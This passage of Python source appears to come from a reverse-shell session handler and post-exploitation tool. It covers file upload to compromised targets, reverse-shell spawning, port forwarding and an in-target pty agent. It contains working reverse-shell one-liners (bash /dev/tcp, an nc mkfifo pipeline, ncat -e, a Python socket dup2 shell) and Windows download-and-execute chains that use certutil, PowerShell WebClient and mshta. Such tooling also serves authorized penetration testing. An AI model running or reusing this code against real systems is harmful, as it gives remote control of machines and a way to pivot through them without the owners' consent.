							else:
								out_open = False
						if stderr_stream in readable:
							try:
								data = stderr_stream.read(options.network_buffer_size)
							except (OSError, ValueError):
								data = b''
							if data:
								err_buf += data
								while b'\n' in err_buf:
									line, err_buf = err_buf.split(b'\n', 1)
									remote_errors.append(line)
									logger.error(str(paint('<REMOTE>').cyan) + ' ' + str(paint(line.decode(errors='replace')).red))
							else:
								if err_buf:
									remote_errors.append(err_buf)
									logger.error(str(paint('<REMOTE>').cyan) + ' ' + str(paint(err_buf.decode(errors='replace')).red))
								err_open = False

				monitor_thread = threading.Thread(target=monitor_remote)
				monitor_thread.start()
			else:
				tar_buffer = io.BytesIO()
				tar_destination, mode = tar_buffer, "r:gz"

			level = self.compression_level if self.agent else 6
			_compression = {}
			if sys.version_info >= (3, 12):
				_compression['compresslevel'] = level
			altnames = []
			try:
				tar = tarfile.open(mode='w|gz', fileobj=tar_destination, dereference=options.link_dereference,
					bufsize=options.network_buffer_size, **_compression)
				if not _compression:
					tar.fileobj.cmp = zlib.compressobj(level, zlib.DEFLATED, -zlib.MAX_WBITS, zlib.DEF_MEM_LEVEL, 0)

				# Do not leak the local uid/gid into the tar: the remote
				# extraction restores ownership (fully_trusted filter), and on
				# hardened kernels root cannot re-open files owned by a foreign
				# uid, which would break re-uploads over existing files.
				_orig_gettarinfo = tar.gettarinfo
				def _clean_gettarinfo(*args, **kwargs):
					info = _orig_gettarinfo(*args, **kwargs)
					if info is not None:
						info.uid = info.gid = 0
						info.uname = info.gname = 'root'
					return info
				tar.gettarinfo = _clean_gettarinfo

				for item in resolved_items:
					try:
						if isinstance(item, tuple):
							filename, data = item

							if randomize_fname:
								filename = Path(filename)
								altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
							else:
								altname = filename

							file = tarfile.TarInfo(name=altname)
							file.size = len(data)
							file.mode = 0o770
							file.mtime = int(time.time())

							tar.addfile(file, io.BytesIO(data))
						else:
							altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
							tar.add(item, arcname=altname)
					except Exception as e:
						logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
						continue
					altnames.append(altname)
				tar.close()
			except Exception as e:
				logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
				if agent_stream_upload:
					cleanup_agent_upload()
				return []

			if agent_stream_upload:
				cleanup_complete = cleanup_agent_upload()
				if not self:
					if pbar:
						pbar.terminate()
					logger.warning("Upload outcome is indeterminate because the session disconnected")
					return []
				if not cleanup_complete:
					if pbar:
						pbar.terminate()
					logger.warning("Upload stream cleanup timed out; outcome is indeterminate")
					return []
				if remote_errors:
					if pbar:
						pbar.terminate()
					logger.warning("Upload failed; partially extracted files may remain on the target")
					return []
				if pbar:
					pbar.update(pbar.end)

			else:
				raw = tar_buffer.getvalue()
				tar_buffer.close()
				raw_size = len(raw)
				remote_tmp = self.tmp
				if not remote_tmp:
					logger.error("No writable directory available on target for upload staging")
					return []
				temp = remote_tmp + "/" + rand(8)
				qtemp = shlex.quote(temp)
				self.uploaded_paths[qtemp] = int(time.time())

				def remove_remote_upload_temp():
					if not self:
						return False
					removed = self.exec(f"rm -f -- {qtemp}; echo $?", value=True)
					if isinstance(removed, str) and removed.strip() == "0":
						self.uploaded_paths.pop(qtemp, None)
						return True
					return False

				logger.trace(paint(f"Uploading to {destination}").cyan)
				pbar = PBar(raw_size, caption=" ", barlen=30, metric=Size)
				slice_size = max(3, options.upload_chunk_size // 4 * 3)
				if self.agent:
					# One EXEC frame per chunk: it must fit Messenger.MAX_PAYLOAD
					# after base64 inflation (+33%) and the heredoc wrapper.
					slice_size = min(slice_size, (Messenger.MAX_PAYLOAD - 1024) * 3 // 4)
				sent = 0
				for offset in range(0, raw_size, slice_size):
					chunk = base64.b64encode(raw[offset:offset + slice_size])
					body = b"\n".join(chunks(chunk, 512)).decode()
					term = "UP_" + rand(16)
					# The trailing '\n:' terminates the heredoc line and gives
					# exec's ';printf <token>' wrapper a valid command position;
					# without it the delimiter line is 'TERM;printf...' and the
					# target shell hangs waiting for the heredoc to end.
					cmd = f"cat >> {qtemp} <<'{term}'\n{body}\n{term}\n:"
					# Agent EXEC must wait for the child; on the persistent
					# shell the token pattern handles that.
					if self.agent:
						response = self.exec(cmd, value=True)
					else:
						response = self.exec(cmd)
					if response is False:
						pbar.terminate()
						logger.error("Upload interrupted")
						if not remove_remote_upload_temp():
							logger.warning(f"Remote temporary file may remain: {temp}")
						return []
					sent = min(offset + slice_size, raw_size)
					pbar.update(sent - pbar.pos)

				logger.debug(paint("--- Remote unpacking...").blue)
				dest = f"-C {shlex.quote(destination)}"
				if self.agent:
					# A fresh sh per agent EXEC cannot carry $temp over, so the
					# exit status is echoed by the same invocation.
					cmd = f'{{ base64 -d 2>/dev/null || base64 -D; }} < {qtemp} | tar xz {dest} 2>&1; echo "ariadne-unpack-rc=$?"'
					response = self.exec(cmd, value=True)
					matched = re.search(r'ariadne-unpack-rc=(\d+)', response if isinstance(response, str) else '')
					exit_code = matched[1] if matched else None
				else:
					cmd = f"{{ base64 -d 2>/dev/null || base64 -D; }} < {qtemp} | tar xz {dest} 2>&1; temp=$?"
					response = self.exec(cmd, value=True)
					exit_code = self.exec("echo $temp", value=True)
				if not remove_remote_upload_temp():
					logger.warning(f"Remote temporary file may remain: {temp}")
				if not (isinstance(exit_code, str) and exit_code.strip() == "0"):
					logger.error(response if response else "Remote unpacking failed or timed out")
					if not self:
						logger.warning("Upload outcome is indeterminate because the session disconnected")
					else:
						logger.warning("Upload failed; partially extracted files may remain on the target")
					return []

		elif self.OS == 'Windows':
			with ExitStack() as stack:
				# Fire up File Server
				server = FileServer(port=0, host=self._host, url_prefix=rand(8), quiet=True)
				server.start()
				stack.callback(lambda: server.term.wait(options.timeout_short))
				stack.callback(lambda: server.stop())
				server.init.wait(options.timeout_short)

				if not hasattr(server, 'id'):
					return []

				tmp_zip = tempfile.NamedTemporaryFile(suffix=".zip", delete=False)
				tempfile_zip = tmp_zip.name
				tmp_zip.close()
				stack.callback(lambda p=tempfile_zip: os.path.exists(p) and os.remove(p))

				tmp_bat = tempfile.NamedTemporaryFile(suffix=".bat", delete=False)
				tempfile_bat = tmp_bat.name
				tmp_bat.close()
				stack.callback(lambda p=tempfile_bat: os.path.exists(p) and os.remove(p))

				with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
					altnames = []
					for item in resolved_items:
						if isinstance(item, tuple):
							filename, data = item
							if randomize_fname:
								filename = Path(filename)
								altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
							else:
								altname = filename
							zip_info = zipfile.ZipInfo(filename=str(altname))
							zip_info.date_time = time.localtime(time.time())[:6]
							myzip.writestr(zip_info, data)
						else:
							if item.is_dir():
								altname = f"{item.name}-{rand(8)}" if randomize_fname else item.name
								myzip.writestr(Path(altname).as_posix().rstrip('/') + '/', b'')
								for p in item.rglob("*"):
									rel = p.relative_to(item)
									altname_file = Path(altname) / rel
									if p.is_dir():
										myzip.writestr(altname_file.as_posix().rstrip('/') + '/', b'')
									elif p.is_file():
										myzip.write(p, arcname=altname_file.as_posix())
							else:
								altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
								myzip.write(item, arcname=altname)
						altnames.append(altname)

				urlpath_zip = server.add(tempfile_zip)

				dst_escaped = destination.replace('\\', '\\\\')
				tmp_escaped = self.tmp.replace('\\', '\\\\')
				temp_remote_file_zip = urlpath_zip.split("/")[-1]

				_zip_url = f'http://{self._host}:{server.port}{urlpath_zip}'
				_zip_dest = f'%TEMP%\\{temp_remote_file_zip}'
				fetch_cmd = (
					f'(certutil -urlcache -split -f "{_zip_url}" "{_zip_dest}" >NUL 2>&1'
					f' || curl -s -o "{_zip_dest}" "{_zip_url}" 2>NUL'
					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\'{_zip_url}\',\'{_zip_dest}\')")'
					f' && echo DOWNLOAD OK'
				)
				unzip_cmd = (
					f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso=new ActiveXObject(\'Scripting.FileSystemObject\'); var z=\'{tmp_escaped}\\\\{temp_remote_file_zip}\'; var src=sh.Namespace(z); var dst=sh.Namespace(\'{dst_escaped}\'); if(src&&dst){{var need=dst.Items().Count+src.Items().Count; dst.CopyHere(src.Items(),1556); for(var i=0;i<600;i++){{if(dst.Items().Count>=need)break; var t=new Date().getTime()+100; while(new Date().getTime()<t){{}}}} try{{fso.DeleteFile(z);}}catch(e){{}}}} close()"'
					f' & (if exist "{_zip_dest}" (tar.exe -xf "{_zip_dest}" -C "{destination}" 2>NUL && del /q "{_zip_dest}"))'
					f' & (if exist "{_zip_dest}" (powershell -nop -w hidden -c "Expand-Archive -LiteralPath \'{_zip_dest}\' -DestinationPath \'{destination}\' -Force" && del /q "{_zip_dest}"))'
					f' & (if not exist "{_zip_dest}" echo UNZIP OK)'
				)

				with open(tempfile_bat, "w") as f:
					f.write(fetch_cmd + "\n")
					f.write(unzip_cmd)

				urlpath_bat = server.add(tempfile_bat)
				temp_remote_file_bat = urlpath_bat.split("/")[-1]
				_bat_url = f'http://{self._host}:{server.port}{urlpath_bat}'
				_bat_dest = f'%TEMP%\\{temp_remote_file_bat}'
				response = self.exec(
					f'(certutil -urlcache -split -f "{_bat_url}" "{_bat_dest}" >NUL 2>&1'
					f' || curl -s -o "{_bat_dest}" "{_bat_url}" 2>NUL'
					f' || powershell -nop -c "(New-Object Net.WebClient).DownloadFile(\\"{_bat_url}\\",\\"{_bat_dest}\\")")'
					f'&"{_bat_dest}"&del "{_bat_dest}"',
					force_cmd=True, value=True, timeout=None)

				if not response:
					logger.error("Upload initialization failed...")
					return []
				if not "DOWNLOAD OK" in response:
					logger.error("Data transfer failed...")
					return []
				if not "UNZIP OK" in response:
					logger.error("Data unpacking failed...")
					return []

		# Present uploads
		uploaded_paths = []
		for item in altnames:
			if self.OS == "Unix":
				uploaded_path = shlex.quote(str(Path(destination) / item))
			elif self.OS == "Windows":
				uploaded_path = f'"{PureWindowsPath(destination, item)}"'
			logger.info(f"{paint('Uploaded').GREEN_white} {paint(uploaded_path).yellow}")
			uploaded_paths.append(uploaded_path)
			print()

		self.uploaded_paths.update(dict.fromkeys(uploaded_paths, int(time.time())))
		return uploaded_paths

	@agent_only
	def script(self, local_script):

		local_script_folder = self.directory / "scripts"
		prefix = datetime.now().strftime("%Y_%m_%d-%H_%M_%S-")

		try:
			local_script_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return False

		if re.match(r'(http|ftp)s?://', local_script, re.IGNORECASE):
			try:
				filename, data = url_to_bytes(local_script)
				if not data:
					return False
			except Exception as e:
				logger.error(e)
				return False

			local_script = local_script_folder / (prefix + filename)
			with open(local_script, "wb") as input_file:
				input_file.write(data)
		else:
			local_script = Path(normalize_path(shell_unescape(local_script)))

		output_file_name = local_script_folder / (prefix + "output.txt")

		try:
			input_file = open(local_script, "rb")
			output_file = open(output_file_name, "wb")
			first_line = input_file.readline().strip()
			#input_file.seek(0) # Maybe it is not needed
			if first_line.startswith(b'#!'):
				program = first_line[2:].decode(errors="replace")
			else:
				logger.error("No shebang found")
				return False

			# The output file is newly created and empty, so -f is enough. Keep
			# options minimal for tail implementations that reject -n +1 -f.
			tail_cmd = f'tail -f {shlex.quote(str(output_file_name))}'
			print(tail_cmd)
			Open(tail_cmd, terminal=True)

			thread = threading.Thread(target=self.exec, args=(program, ), kwargs={
				'stdin_src': input_file,
				'stdout_dst': output_file,
				'stderr_dst': output_file
			}, daemon=True)
			thread.start()

		except Exception as e:
			logger.error(e)
			return False

		return output_file_name

	def spawn(self, port=None, host=None):

		if self.OS == "Unix":
			if any([self.listener, port, host]):

				if self.listener and self.listener.jump:
					if len(self.listener.jump) == 1:
						host, port = self.listener.jump[0]
					else:
						[print(f"* {j[0]}:{j[1]}") for j in self.listener.jump]
						while(True):
							e = ask("Endpoint: ")
							try:
								host, port = e.split(':')
								break
							except ValueError:
								logger.error(f"Invalid jump endpoint: {e}")
				else:
					port = port or self._port
					host = host or self._host

					if not next((listener for listener in list(core.listeners.values()) if listener.port == port), None):
						new_listener = TCPListener(host, port)
						if not new_listener:
							logger.error(f"Cannot listen on {host}:{port}. Spawning shell aborted")
							return False

				if self.agent:
					logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
					self.exec(f"""
						import os, socket
						if os.fork() == 0:
							os.setsid()
							s = socket.socket()
							s.connect(("{host}", {port}))
							for fd in (0, 1, 2):
								os.dup2(s.fileno(), fd)
							os.execl({self.shell!r}, {self.shell!r})
							os._exit(1)
					""", python=True)
					return True

				if self.bin['bash']:
					cmd = f'printf "(bash >& /dev/tcp/{host}/{port} 0>&1) &"|bash'
				elif self.bin['nc'] and self.bin['sh']:
					cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
				elif self.bin['sh']:
					_q_sh = shlex.quote(self.bin["sh"])
					ncat_cmd = f'{_q_sh} -c "{{}} -e {_q_sh} {host} {port} &"'
					if not (self._ncat and not self.exec(f"test -x {shlex.quote(self._ncat)} || echo x")):
						logger.warning("ncat is not available on the target")
						if self.system == 'Linux' and self.arch == 'x86_64':
							self._ncat = self.need_binary("ncat", URLS['ncat'])
						else:
							logger.error(f"No prebuilt ncat binary for {self.system}/{self.arch}")
					if not self._ncat:
						logger.error("Spawning shell aborted")
						return False
					cmd = ncat_cmd.format(shlex.quote(self._ncat))
				else:
					logger.error("No available shell binary is present...")
					return False

				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
				self.exec(cmd)

				# TODO maybe destroy the new_listener upon getting a shell?
				# if new_listener:
				#	new_listener.stop()
			else:
				host, port = self.socket.getpeername()
				logger.info(f"Attempting to spawn a bind shell from {host}:{port}")
				if not Connect(host, port):
					logger.info("Spawn bind shell failed. I will try getting a reverse shell...")
					return self.spawn(port, self._host)

		elif self.OS == 'Windows':
			logger.warning("Spawn Windows shells is not implemented yet")
			return False

		return True

	@agent_only
	def portfwd(self, _type, lhost, lport, rhost, rport):

		session = self
		control = ControlQueue()
		info = (_type, lhost, lport, rhost, rport)

		class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
			def handle(self):

				self.request.setblocking(False)
				allocated_streams = []

				def cleanup_allocated_streams():
					for stream in allocated_streams:
						stream.close()
						session.remove_stream(stream)

				stdin_stream = session.new_streamID
				if stdin_stream:
					allocated_streams.append(stdin_stream)
				stdout_stream = session.new_streamID
				if stdout_stream:
					allocated_streams.append(stdout_stream)
				stderr_stream = session.new_streamID
				if stderr_stream:
					allocated_streams.append(stderr_stream)

				if not all([stdin_stream, stdout_stream, stderr_stream]):
					cleanup_allocated_streams()
					return

				code = rf"""
				import socket
				client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				try:
					client.connect(({rhost!r}, {int(rport)}))
					connected = True
				except socket.error:
					connected = False
				if connected:
					client.setblocking(False)
					pending = "".encode()
					stdin_done = False
					wr_shutdown = False
					remote_done = False
					while True:
						rlist = []
						if not remote_done:
							rlist.append(client)
						if not stdin_done and not pending:
							rlist.append(stdin_stream)
						wlist = []
						if pending:
							wlist.append(client)
						if not rlist and not wlist:
							break
						readables, writables, _ = select.select(rlist, wlist, [])
						if stdin_stream in readables:
							data = stdin_stream.read({options.network_buffer_size})
							if not data:
								stdin_done = True
							else:
								pending = pending + data
						if client in writables:
							try:
								pending = pending[client.send(pending):]
							except socket.error:
								if sys.exc_info()[1].args[0] not in (errno.EAGAIN, errno.EWOULDBLOCK):
									break
						if stdin_done and not pending and not wr_shutdown:
							try:
								client.shutdown(socket.SHUT_WR)
							except socket.error:
								pass
							wr_shutdown = True
						if client in readables:
							try:
								data = client.recv({options.network_buffer_size})
							except socket.error:
								if sys.exc_info()[1].args[0] not in (errno.EAGAIN, errno.EWOULDBLOCK):
									break
							else:
								if not data:
									remote_done = True
								else:
									stdout_stream.write(data)
					client.close()
				else:
					client.close()
				"""
				try:
					session.exec(
						code,
						python=True,
						stdin_stream=stdin_stream,
						stdout_stream=stdout_stream,
						stderr_stream=stderr_stream,
						stdin_src=self.request,
						stdout_dst=self.request,
						agent_control=control
					)
				finally:
					cleanup_allocated_streams()

		class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
			allow_reuse_address = True
			request_queue_size = 100
			daemon_threads = True

			@handle_bind_errors
			def server_bind(self, lhost, lport):
				self.server_address = (lhost, int(lport))
				super().server_bind()

		def server_thread():
			with ThreadedTCPServer(None, ThreadedTCPRequestHandler, bind_and_activate=False) as server:
				if not server.server_bind(lhost, lport):
					# The thread's return value goes nowhere; without this
					# the operator gets silence on a duplicate/bound port.
					logger.error(f"Cannot set up Port Forwarding: {lhost}:{lport} is already in use")
					return False
				server.server_activate()
				Forwarding(session, info, control, threading.current_thread(), server)
				logger.info(f"Setup Port Forwarding: {lhost}:{lport} {'->' if _type=='L' else '<-'} {rhost}:{rport}")
				server.serve_forever()

		portfwd_thread = threading.Thread(target=server_thread)
		portfwd_thread.start()

	def maintain(self):
		hosts = core.hosts.get(self.name)
		if not (hosts and len(hosts) < options.maintain):
			return True
		session = hosts[-1]
		logger.warning(paint(
			f" --- Session {session.id} is trying to maintain {options.maintain} "
			f"active shells on {self.name} ---"
		).blue)
		return session.spawn()

	def kill(self):
		if self not in core.rlist:
			return True

		if menu.sid == self.id:
			menu.set_id(None)

		thread_name = threading.current_thread().name
		logger.debug(f"Thread <{thread_name}> wants to kill session {self.id}")

		if thread_name != 'Core':
			if self.OS:
				for module in modules().values():
					if module.enabled and module.on_session_end:
						module.run(self, None)
			else:
				self.id = randint(10**10, 10**11-1)
				core.sessions[self.id] = self

			core.control << (lambda: core.sessions[self.id].kill())
			return

		self.subchannel.control.close()
		self.subchannel.close()
		with self.stream_lock:
			self._closing = True
			streams = list(self.streams.values())
			self.streams.clear()
		for stream in streams:
			stream << b""
			stream.close()

		core.rlist.remove(self)
		if self in core.wlist:
			core.wlist.remove(self)
		try:
			self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0)) # RST
		except OSError:
			pass
		self.socket.close()

		if not self.OS:
			message = f"Invalid shell from {self.ip}"
		elif not hasattr(self, 'name'):
			message = f"Incomplete shell from {self.ip} died during setup"
		else:
			message = f"Session [{self.id}] died..."
			others = any(
				s is not self and getattr(s, 'name', None) == self.name
				for s in list(core.sessions.values())
			)
			if not others:
				message += f" We lost {self.name_colored}"

		if self.id in core.sessions:
			del core.sessions[self.id]
		logger.error(message)

		with self.log_lock:
			self.logfile.close()

		if self.is_attached:
			self.detach()
		elif self.attaching:
			self.attaching = False
			menu.show()

		for fwd in list(self.tasks['portfwd']):
			fwd.stop()

		if self.OS and hasattr(self, 'name'):
			threading.Thread(target=self.maintain).start()
		return True




def cloexec(fd):
	# Handler-side helper: the agent payload defines its own nested copy, so
	# this only matters for streams created without a session. fcntl is
	# Unix-only, hence the local import.
	try:
		import fcntl
		flags = fcntl.fcntl(fd, fcntl.F_GETFD)
		fcntl.fcntl(fd, fcntl.F_SETFD, flags | fcntl.FD_CLOEXEC)
	except Exception:
		pass


class Stream:
	def __init__(self, _id, _session=None):
		self.id = _id
		self.max_payload = Messenger.MAX_PAYLOAD - len(_id)
		self.writebuf = None
		self.feed_thread = None
		self._feed_lock = threading.Lock()
		self.session = _session
		self.read_closed = True
		self.write_closed = True
		self._read = self._write = None
		self._read, self._write = os.pipe()
		self.read_closed = False
		self.write_closed = False

		if self.session is None:
			self.writefunc = lambda data: respond(self.id + data)
			cloexec(self._write)
			cloexec(self._read)
		else:
			self.writefunc = lambda data: self.session.send(Messenger.message(Messenger.STREAM, self.id + data))

	def __lshift__(self, data):
		self._feed_lock.acquire()
		try:
			if self.writebuf is None:
				self.writebuf = queue.Queue()
			self.writebuf.put(data)
			if self.feed_thread is None:
				# Daemon: the feed thread holds no state that must be flushed
				# at interpreter exit, and daemonizing keeps a stream closed
				# without a final b"" from blocking _thread._shutdown().
				self.feed_thread = threading.Thread(target=self.feed, name="feed stream -> " + repr(self.id), daemon=True)
				self.feed_thread.start()
		finally:
			self._feed_lock.release()

	def feed(self):
		while True:
			data = self.writebuf.get()
			if not data:
				self.close_write()
				break
			try:
				os.write(self._write, data)
			except OSError:
				break

	def fileno(self):
		return self._read

	def write(self, data):
		while len(data) > self.max_payload:
			self.writefunc(data[:self.max_payload])
			data = data[self.max_payload:]
		self.writefunc(data)

	def close_write(self):
		if not self.write_closed:
			self.write_closed = True
			try:
				os.close(self._write)
			except OSError:
				pass
			# Prevent a closed fd number from being reused while a consumer
			# still selects on this stream; -1 makes select() raise ValueError.
			self._write = -1

	def close(self):
		self.close_read()
		self.close_write()
		# Wake a feed thread waiting on an empty queue; without this, closing
		# a stream that never got a final b"" would leave the feed thread
		# blocked on writebuf.get() forever.
		if self.writebuf is not None:
			try:
				self.writebuf.put(b"")
			except Exception:
				pass

	def __del__(self):
		self.close()

	def close_read(self):
		if not self.read_closed:
			self.read_closed = True
			try:
				os.close(self._read)
			except OSError:
				pass
			self._read = -1

	def read(self, n):
		try:
			data = os.read(self._read, n)
		except OSError:
			return "".encode()
		if not data:
			self.close_read()
		return data



def agent():
	import os, sys, tty, pty, shlex, fcntl, errno, struct, signal, termios, select, threading
	signal.signal(signal.SIGINT, signal.SIG_DFL)
	signal.signal(signal.SIGQUIT, signal.SIG_DFL)
	normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))

	if sys.version_info[0] == 2:
		import Queue as queue
	else:
		import queue
	try:
		import io
		bufferclass = io.BytesIO
	except:
		import StringIO
		bufferclass = StringIO.StringIO

	SHELL = {}
	NET_BUF_SIZE = {}
	{}
	{}

	def respond(_value, _type=Messenger.STREAM):
		wlock.acquire()
		outbuf.seek(0, 2)
		outbuf.write(Messenger.message(_type, _value))
		if not pty.STDOUT_FILENO in wlist:
			wlist.append(pty.STDOUT_FILENO)
			os.write(control_in, "1".encode())
		wlock.release()

	def cloexec(fd):
		try:
			flags = fcntl.fcntl(fd, fcntl.F_GETFD)
			fcntl.fcntl(fd, fcntl.F_SETFD, flags | fcntl.FD_CLOEXEC)
		except:
			pass

	shell_pid, master_fd = pty.fork()
	if shell_pid == pty.CHILD:
		os.execl(SHELL, SHELL, '-i')
	try:
		tty.setraw(pty.STDIN_FILENO)
	except:
		pass
	try:
		signal.signal(signal.SIGCHLD, signal.SIG_IGN)
	except:
		pass

	try:
		streams = dict()
		messenger = Messenger(bufferclass)
		outbuf = bufferclass()
		ttybuf = bufferclass()

		wlock = threading.Lock()
		control_out, control_in = os.pipe()
		cloexec(control_out)
		cloexec(control_in)

		rlist = [control_out, master_fd, pty.STDIN_FILENO]
		wlist = []
		for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO, pty.STDERR_FILENO):
			flags = fcntl.fcntl(fd, fcntl.F_GETFL)
			fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
			cloexec(fd)

		while True:
			try:
				rfds, wfds, _ = select.select(rlist, wlist, [])
			except Exception:
				for _fdlist in (rlist, wlist):
					for _fd in _fdlist[:]:
						try:
							select.select([_fd], [], [], 0)
						except Exception:
							_fdlist.remove(_fd)
				continue

			for readable in rfds:
				if readable is control_out:
					os.read(control_out, 1)

				elif readable is master_fd:
					try:
						data = os.read(master_fd, NET_BUF_SIZE)
					except OSError:
						e = sys.exc_info()[1]
						if e.args and e.args[0] in (errno.EAGAIN, errno.EWOULDBLOCK):
							continue
						data = ''.encode()
					respond(data, Messenger.SHELL)
					if not data:
						rlist.remove(master_fd)
						try:
							os.close(master_fd)
						except:
							pass

				elif readable is pty.STDIN_FILENO:
					try:
						data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
					except OSError:
						e = sys.exc_info()[1]
						if e.args and e.args[0] in (errno.EAGAIN, errno.EWOULDBLOCK):
							continue
						data = None
					if not data:
						rlist.remove(pty.STDIN_FILENO)
						# Debug (dev mode): distinguish socket FIN (data=b'')
						# from RST/error (data=None + exc) at agent death.
						# Braces are doubled because the agent source is
						# str.format()-ed at deploy time.
						if os.environ.get('ARIADNE_DEBUG'):
							try:
								open('/tmp/agent_exit.txt', 'w').write(
									f'agent loop exit: data={{data!r}} exc={{sys.exc_info()[1]!r}}')
							except OSError:
								pass
						break

					messages = messenger.feed(data)
					for _type, _value in messages:
						if _type == Messenger.SHELL:
							ttybuf.seek(0, 2)
							ttybuf.write(_value)
							if not master_fd in wlist:
								wlist.append(master_fd)

						elif _type == Messenger.RESIZE:
							fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)

						elif _type == Messenger.EXEC:
							sb = str(Messenger.STREAM_BYTES)
							header_size = 1 + int(sb) * 3
							__type, stdin_stream_id, stdout_stream_id, stderr_stream_id = struct.unpack(
								'!c' + (sb + 's') * 3,
								_value[:header_size]
							)
							cmd = _value[header_size:]

							if not stdin_stream_id in streams:
								streams[stdin_stream_id] = Stream(stdin_stream_id)
							if not stdout_stream_id in streams:
								streams[stdout_stream_id] = Stream(stdout_stream_id)
							if not stderr_stream_id in streams:
								streams[stderr_stream_id] = Stream(stderr_stream_id)

							stdin_stream = streams[stdin_stream_id]
							stdout_stream = streams[stdout_stream_id]
							stderr_stream = streams[stderr_stream_id]

							rlist.append(stdout_stream)
							rlist.append(stderr_stream)

							if __type == 'S'.encode():
								pid = os.fork()
								if pid == 0:
									os.dup2(stdin_stream._read, 0)
									os.dup2(stdout_stream._write, 1)
									os.dup2(stderr_stream._write, 2)
									os.execl({}, "sh", "-c", cmd)
									os._exit(1)
								stdin_stream.close_read()
								stdout_stream.close_write()
								stderr_stream.close_write()

							elif __type == 'P'.encode():
								def run(stdin_stream, stdout_stream, stderr_stream):
									try:
										{}
									except:
										stderr_stream << (str(sys.exc_info()[1]) + "\n").encode()
									stdin_stream.close_read()
									stdin_stream << "".encode()
									streams.pop(stdin_stream.id, None)
									stdout_stream << "".encode()
									stderr_stream << "".encode()
								threading.Thread(target=run, args=(stdin_stream, stdout_stream, stderr_stream)).start()

						# Incoming streams
						elif _type == Messenger.STREAM:
							stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
							target_stream = streams.get(stream_id)
							if target_stream is not None:
								target_stream << data
								if not data:
									streams.pop(stream_id, None)

				# Outgoing streams
				else:
					data = readable.read(NET_BUF_SIZE)
					readable.write(data)
					if not data:
						rlist.remove(readable)
						del streams[readable.id]

			else:
				for writable in wfds:

					if writable is pty.STDOUT_FILENO:
						sendbuf = outbuf
						wlock.acquire()

					elif writable is master_fd:
						sendbuf = ttybuf

					try:
						sent = os.write(writable, sendbuf.getvalue())
					except OSError:
						e = sys.exc_info()[1]
						if not (e.args and e.args[0] in (errno.EAGAIN, errno.EWOULDBLOCK)):
							wlist.remove(writable)
						if sendbuf is outbuf:
							wlock.release()
						continue

					sendbuf.seek(sent)
					remaining = sendbuf.read()
					sendbuf.seek(0)
					sendbuf.truncate()
					sendbuf.write(remaining)
					if not remaining:
						wlist.remove(writable)
					if sendbuf is outbuf:
						wlock.release()
				continue
			break
	except:
		_, e, t = sys.exc_info()
		import traceback
		traceback.print_exc()
		traceback.print_stack()
	try:
		os.close(master_fd)
	except:
		pass
	os._exit(0)




def listener_menu():
	if not core.listeners:
		return False

	listener_menu.active = True
	func = lambda: None
	listener_menu.control_r, listener_menu.control_w = os.pipe()

	listener_menu.finishing = threading.Event()

	while True:
		tty.setraw(sys.stdin)
		stdout(
			f"\r\x1b[?25l{paint('> ').white} "
			f"{paint('Main Menu').green} (m) "
			f"{paint('Payloads').magenta} (p) "
			f"{paint('Clear').yellow} (Ctrl-L) "
			f"{paint('Quit').red} (q/Ctrl-C)\r\n".encode()
		)

		r, _, _ = select([sys.stdin, listener_menu.control_r], [], [])

		if sys.stdin in r:
			command = sys.stdin.read(1).lower()
			if command == 'm':
				func = menu.show
				break
			elif command == 'p':
				restore_tty()
				listeners = ask_listener()
				target_os = ask_target_os() if listeners else None
				if target_os:
					print()
					for listener in listeners:
						print(listener.payloads(None, target_os), end='\n\n')
			elif command == '\x0C':
				os.system("clear")
			elif command in ('q', '\x03'):
				func = core.stop
				menu.stop = True
				break
			stdout(b"\x1b[1A")
			continue
		break

	restore_tty()
	stdout(b"\x1b[?25h\r")
	func()
	for fd_name in ('control_r', 'control_w'):
		fd = getattr(listener_menu, fd_name, None)
		if fd is not None:
			try:
				os.close(fd)
			except OSError:
				pass
			setattr(listener_menu, fd_name, None)
	listener_menu.active = False
	listener_menu.finishing.set()
	return True
